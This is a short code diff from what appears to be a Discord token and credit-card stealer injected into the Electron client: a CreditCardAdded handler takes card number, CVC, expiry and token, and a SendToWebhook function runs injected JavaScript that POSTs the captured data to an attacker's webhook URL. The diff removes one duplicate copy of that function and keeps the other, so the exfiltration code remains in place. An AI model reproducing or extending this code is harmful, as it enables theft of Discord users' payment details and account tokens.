@@ -495,23 +495,15 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
 function SendToWebhook(info) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
-        xhr.open("POST", "${webhook}", true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-        xhr.send(JSON.stringify(${info}));
-    `, !0)
-}
-
-
-function SendToWebhook(info) {
-    const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
         xhr.open("POST", "${sexhook}", true);
         xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
         xhr.send(JSON.stringify(${info}));
     `, !0)
 }
+
+
+
 function GetBadges(flags) {
 
     const Discord_Employee = 1;
